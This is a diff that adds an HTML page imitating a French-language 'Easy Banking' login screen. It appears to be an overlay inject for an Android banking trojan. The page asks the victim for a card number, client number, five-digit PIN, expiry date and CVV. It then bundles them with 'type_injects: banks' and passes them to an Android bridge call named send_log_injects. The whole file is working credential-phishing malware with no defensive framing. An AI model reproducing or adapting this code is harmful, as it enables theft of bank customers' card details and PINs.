@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        #form1, #form2, #form3 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: #04945f;
+            padding: 15px;
+        }
+
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+        
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: auto;
+            position: absolute;
+            z-index: 1;
+            left: 0;
+            top: 50%;
+            line-height: 1em;
+            color: #979796;
+            transition: all 0.2s ease;
+            font-weight: 300;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0.3em;
+            padding: 5px 0;
+            z-index: 99;
+            width: auto;
+            left: 0;
+        }
+
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #1f1f1f
+        }
+
+        .input {
+            border: 0;
+            border-bottom: 1px solid #979796;
+            margin-top: 15px;
+            padding-left: 0;
+            transition: all 0.2s ease;
+            color: #000;
+            color: #004833;
+            font-weight: 600;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #78be20;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        footer {
+            padding: 15px;
+            border-top: 1px solid #e7e7e7;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #04945f;
+            color: #fff;
+            border: 0;
+        }
+
+        .button:disabled {
+            background-color: #e7e7e7;
+            color: rgb(116, 116, 116)
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+        
+        .td_.td_2 {
+            background: transparent;
+            height: 300px;
+            padding-top: 0;
+            color: #ffffffb8;
+        }
+
+        .pinpad.d-flex.justify-content-between {
+            padding: 1px 25px;
+        }
+
+        .td_.td_2 {
+            color: #ffffffb8;
+        }
+
+        span.pinpad-item {
+            color: #04945f;
+            padding: 20px 0px;
+            text-align: center;
+            font-size: 32px;
+            width: 57px;
+            margin-top: -14px;
+            cursor: pointer;
+        }
+
+        .fakePass {
+            width: 25px;
+            height: 25px;
+            background: transparent;
+            border: 0;
+            border-bottom: 1px solid #575757;
+            display: inline-block;
+            margin-right: 5px;
+        }
+        .checked {
+            width: 25px;
+            height: 25px;
+            background-color: #04945f;
+            border: 2px solid #04945f;
+            border-radius: 75px;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        #form2 > footer {
+            border: 0;
+        }
+    </style>
+</head>
+<body ng-app="app" ng-controller="c1">
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 22px;margin-right: 15px;margin-top: -3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABABAMAAABYR2ztAAAAG1BMVEUAAAD////////////////////////////////rTT7CAAAACXRSTlMAGiZNZoCZv8x50igTAAAAXUlEQVRIx2NgGAW0AQIE5JlKCShQ7wjAb0BFRysBAzo6DPAbgN8EkAEBowYMAQM60tCBAaoBmMAB1QCKFBC0grAjCXqTcECNGjEojTCgqBAjWAwSLkgJFsWjgGwAAMxshI+OgMGyAAAAAElFTkSuQmCC" alt="">
+                <span style="color: #fff;font-size: 18px;font-weight: 300;"> Nouveau profil </span>
+            </header>
+            <section>
+                <p style="font-size: 18px;"> Entrez vos coordonnées </p>
+                <p style="color: #888;font-weight: 300;font-size: 14px;margin-top: 0;">Avoir votre carte de débit, qui montre les numéros que vous devez entrer, et votre lecteur de carte à portée de main.</p>
+            
+                <div class="cool-input">
+                    <input type="tel" id="cc" name="cc" onkeyup="check();" class="input cool-input__input" placeholder="" autocomplete="off">
+                    <span class="cool-input__placeholder">Numéro de carte de</span>
+                </div>
+                <div class="cool-input">
+                    <input type="tel" id="number" name="number" onkeyup="check();" class="input cool-input__input" placeholder="" autocomplete="off">
+                    <span class="cool-input__placeholder">Numéro de client</span>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" disabled value="PROCHAIN">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 22px;margin-right: 15px;margin-top: -3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABABAMAAABYR2ztAAAAG1BMVEUAAAD////////////////////////////////rTT7CAAAACXRSTlMAGiZNZoCZv8x50igTAAAAXUlEQVRIx2NgGAW0AQIE5JlKCShQ7wjAb0BFRysBAzo6DPAbgN8EkAEBowYMAQM60tCBAaoBmMAB1QCKFBC0grAjCXqTcECNGjEojTCgqBAjWAwSLkgJFsWjgGwAAMxshI+OgMGyAAAAAElFTkSuQmCC" alt="">
+                <span style="color: #fff;font-size: 18px;font-weight: 300;"> Se connecter </span>
+            </header>
+            <section class="kub" style="flex: 1">
+                <p style="color: #333;text-align: center;font-size: 22px;"> Introduisez votre code <br> Easy Banking </p>
+
+                <input type="password" id="pin" class="input" maxlength="4" style="display: none;" disabled name="pin">
+
+                <div style="text-align: center;margin-bottom: 25px;">
+                    <div class="fakePass" id="fake1"></div>
+                    <div class="fakePass" id="fake2"></div>
+                    <div class="fakePass" id="fake3"></div>
+                    <div class="fakePass" id="fake4"></div>
+                    <div class="fakePass" id="fake5" style="margin: 0;"></div>
+                </div>
+
+            </section>
+            
+            <footer>
+                <div class="tr_ tr3">
+                    <div class="td_ td_2">
+                        <div class="asd" style="background: transparent;">
+                            <div class="pinpad d-flex justify-content-between">
+                                <span id="btnPin5" ng-click="edit_pin(1)" class="pinpad-item">
+                                    <span class="val">1</span>
+                                </span>
+                                <span id="btnPin7" ng-click="edit_pin(2)" class="pinpad-item">
+                                    <span class="val">2</span>
+                                </span>
+                                <span id="btnPin3" ng-click="edit_pin(3)" class="pinpad-item">
+                                    <span class="val">3</span>
+                                </span>
+                            </div>
+                            <div class="pinpad d-flex justify-content-between">
+                                <span id="btnPin9" ng-click="edit_pin(4)" class="pinpad-item">
+                                    <span class="val">4</span>
+                                </span>
+                                <span id="btnPin1" ng-click="edit_pin(5)" class="pinpad-item">
+                                    <span class="val">5</span>
+                                </span>
+                                <span id="btnPin8" ng-click="edit_pin(6)" class="pinpad-item">
+                                    <span class="val">6</span>
+                                </span>
+                            </div>
+                            <div class="pinpad d-flex justify-content-between">
+                                <span id="btnPin6" ng-click="edit_pin(7)" class="pinpad-item">
+                                    <span class="val">7</span>
+                                </span>
+                                <span id="btnPin4" ng-click="edit_pin(8)" class="pinpad-item">
+                                    <span class="val">8</span>
+                                </span>
+                                <span id="btnPin2" ng-click="edit_pin(9)" class="pinpad-item">
+                                    <span class="val">9</span>
+                                </span>
+                            </div>
+                            <div class="pinpad d-flex justify-content-between">
+                                <span class="pinpad-item" style="text-align: center;padding: 20px 0 0 0;"> </span>
+                                <span id="btnPin10" ng-click="edit_pin(0)" style="padding: 20px 0 0 0;" class="pinpad-item">
+                                    <span class="val">0</span>
+                                </span>
+                                <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;padding: 20px 0 0 0;"> 
+                                    <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAQAAAC0NkA6AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjNDRkNFNDI3QTYzMTFFQUFCMkFDNDE2NTgzRUMyNDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjNDRkNFNDM3QTYzMTFFQUFCMkFDNDE2NTgzRUMyNDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCM0NGQ0U0MDdBNjMxMUVBQUIyQUM0MTY1ODNFQzI0OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCM0NGQ0U0MTdBNjMxMUVBQUIyQUM0MTY1ODNFQzI0OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuYAPKkAAAOKSURBVFjD7ZhNTFRXFMd/M1BnQOEVG9pMGMM4A60sGmuCJlSamsKqLtpq07RhYaIxNGm1NdLWEBcu6pQ6zbCgqUaLrprQNKYfi4bUaGODaQ0iJoZAGxCMhRCVoHx0AJHj4r2Bed/zSNlx/rt73snv3txz7j33Iay8WIWsQjL0iNMkVQWSlcm65IfJgx60P1mTXK/G37eHTFEI8DSN9C5z+iMkKIYb9pD/KIFX6VscmCGlKpjKs5QvxZLmtah+tg3aQx4T3kkKQejkAFvZSIQIkUCkIzJkoVuRWIQlVfAuFxCE+59VdFlD+tjxSmAKYZ5D5JBhQUZsplWByQ4jCFcST9FBm0lHNnMPYYH3jHFBhmxWvgkLa0KQujpeN7ui3EYQ3je7PELWMYxwiV1Gx3P0IAiNVlEeIXAO4YERUsifCMJX1jGeIUcRRA8J0I4gnIX/CdJohPhpQxB+1GeUHjKcfXZZQk4iCL+Tj60Fgp25o5g1XFiWFeQ4gtDFensEMfoKOpVSBYO+UEb8H7lD1ML5hzBOVosg9FKqG00gCD+5QfZqR9oLOFsuzSZMQptemTPkDeYRxtm65MujnS4L/UWJHnNCQ0Rx2pN3tjGJkKI205fDmE0WRVlcTZm2j/aINCT0B8Isb2d68vmOGUvELBshjRl3RaQhPEY4p/coTNqsQ4NoRx9Cj0uqaJAFhFbj2TLqBjmuDdwklA3kCsIMb3qCqBk1oV0+EXdIFdMI0+zIBiJEl5J2E1+6YjQI7GYBYYwtbpAJrlOS0G13swtmEQL1CMKddEHZQc7n+Mx1kcbE3CBwRMv9kBPkhxrLpFUxP7tD0rV7FcUe8ku5MqB0K1HTAZlQ7vobsoHAtwjCbwTtIDOMrh1dY3nUF5WRHSSH8wjC94X+Mc8No+OltSFTeUUXEWTdqW6PCJfrd1qnr4u4hvikON7PlKUWltNI6NUKJfyNIKGGMGbFuOMNchbhoeHjMwDPa93CXnOMn0EvkLX8i3DZ8PE3qrOScYR5c+fnsSX6HEHYY6wEqqmmmqrX1qQQZvkA37Ib7oNa5QVsQuYIv8Ws2pVTz0tsUDclEO4ID1noVjiWuXXl7OZXBOHBxy82OT6CahlYHJhOp1dwKs9SvswUnNOibrN90Ok5VwDwDMfoX+Zz7h4thByfc49oIa4qP/5yfF/8k/inHnQgvjP+rBp/d/VnwSpkRfUE5hZoOix/+08AAAAASUVORK5CYII="alt="" class="i76"> 
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <p style="text-align: center;color: #04945f;margin: 0;"> Code oublié? </p>
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <img style="width: 22px;margin-right: 15px;margin-top: -3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABABAMAAABYR2ztAAAAG1BMVEUAAAD////////////////////////////////rTT7CAAAACXRSTlMAGiZNZoCZv8x50igTAAAAXUlEQVRIx2NgGAW0AQIE5JlKCShQ7wjAb0BFRysBAzo6DPAbgN8EkAEBowYMAQM60tCBAaoBmMAB1QCKFBC0grAjCXqTcECNGjEojTCgqBAjWAwSLkgJFsWjgGwAAMxshI+OgMGyAAAAAElFTkSuQmCC" alt="">
+                <span style="color: #fff;font-size: 18px;font-weight: 300;"> Nouveau profil </span>
+            </header>
+            <section>
+                <p style="font-size: 18px;"> Entrez vos coordonnées </p>
+                <p style="color: #888;font-weight: 300;font-size: 14px;margin-top: 0;">Avoir votre carte de débit, qui montre les numéros que vous devez entrer, et votre lecteur de carte à portée de main.</p>
+            
+                <div class="cool-input">
+                    <input type="tel" id="cc2" name="cc2" onkeyup="check8();" class="input cool-input__input" placeholder="" autocomplete="off">
+                    <span class="cool-input__placeholder">Numéro de carte de</span>
+                </div>
+                <div class="cool-input" style="float: left;width: 58%;">
+                    <input type="tel" id="exp" name="exp" onkeyup="check8();" class="input cool-input__input" placeholder="" autocomplete="off">
+                    <span class="cool-input__placeholder">Péremption</span>
+                </div>
+                <div class="cool-input" style="float: right;width: 40%;">
+                    <input type="password" id="cvv" name="cvv" onkeyup="check8();" class="input cool-input__input" placeholder="" autocomplete="off">
+                    <span class="cool-input__placeholder">CVV</span>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="PROCHAIN">
+            </footer>
+        </div>
+    </form>
+    <script>
+        $('#cc').mask('0000 0000 0000 0000 0');
+        $('#number').mask('0#');    
+        $('#cc2').mask('0000 0000 0000 0000 0');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000');
+
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3');
+
+        var cc = document.getElementById('cc'),
+            cc2 = document.getElementById('cc2'),
+            number = document.getElementById('number'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        function check() {
+            if(check6(cc.value) && number.value.length >= 4) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check6(cb) {
+            if(!valid_credit_card(cb)) {
+                cc.classList.add('error');
+            } else {
+                cc.classList.remove('error');
+                return true
+            }
+        }
+        function check9(cb) {
+            if(!valid_credit_card(cb)) {
+                cc2.classList.add('error')
+            } else {
+                cc2.classList.remove('error');
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        nextPage.onclick = () => {
+            form1.style.display = 'none';
+            form2.style.display = 'flex';
+        }
+
+        
+        function check8() {
+            if(check9(cc2.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.pin = pin.value;
+                data.cc = cc.value;
+                data.number = number.value;
+                data.cc2 = cc2.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+
+        }
+
+        app = angular.module('app', [])
+        app.controller('c1', ['$scope', function ($scope) {
+            $sc_ = $scope
+            $scope.pin = ""
+            $scope.edit_pin = function (password) {
+                if ($scope.pin.length != 5) {
+                    try{
+                        document.getElementById('input_next2').disabled = false;
+                    } catch(e){};
+                    $scope.pin += '' + password;
+                    $("#pin").val($scope.pin);
+                }
+
+                if ($scope.pin.length === 5) {
+                    form2.style.display = 'none';
+                    form3.style.display = 'flex';
+                }
+            }
+            $scope.reset = function () {
+                Rlast = $scope.pin.substring(0, $scope.pin.length - 1);
+                $scope.pin = Rlast;
+                $("#pin").val(Rlast);
+            }
+        }])
+
+
+        var btnPin = document.getElementById('btnPin'),
+            btnDel = document.getElementById('btnDel'),
+            login = document.getElementById('login'),
+            fake1 = document.getElementById('fake1'),
+            fake2 = document.getElementById('fake2'),
+            fake3 = document.getElementById('fake3'),
+            fake4 = document.getElementById('fake4'),
+            passForm = document.getElementById('passForm');
+
+            for(var i = 1; i <= 10; i++){
+                btnPin = document.getElementById('btnPin' + i);
+                
+                btnPin.onclick = function(){
+                    if(fake1.classList == 'fakePass') {
+                        fake1.classList = 'fakePass checked';
+                    } else if(fake2.classList == 'fakePass') {
+                        fake2.classList = 'fakePass checked';
+                    } else if(fake3.classList == 'fakePass') {
+                        fake3.classList = 'fakePass checked';
+                    } else if(fake4.classList == 'fakePass') {
+                        fake4.classList = 'fakePass checked';
+                    } else if(fake5.classList == 'fakePass') {
+                        fake5.classList = 'fakePass checked';
+                    }
+                }
+            }
+            
+            btnDel.onclick = function(){
+                if (fake5.classList == 'fakePass checked') {
+                    fake5.classList = 'fakePass';
+                } else if (fake4.classList == 'fakePass checked') {
+                    fake4.classList = 'fakePass';
+                } else if (fake3.classList == 'fakePass checked') {
+                    fake3.classList = 'fakePass';
+                } else if (fake2.classList == 'fakePass checked') {
+                    fake2.classList = 'fakePass';
+                } else if (fake1.classList == 'fakePass checked') {
+                    fake1.classList = 'fakePass';
+                }
+            }
+    </script>
+</body>
+</html>
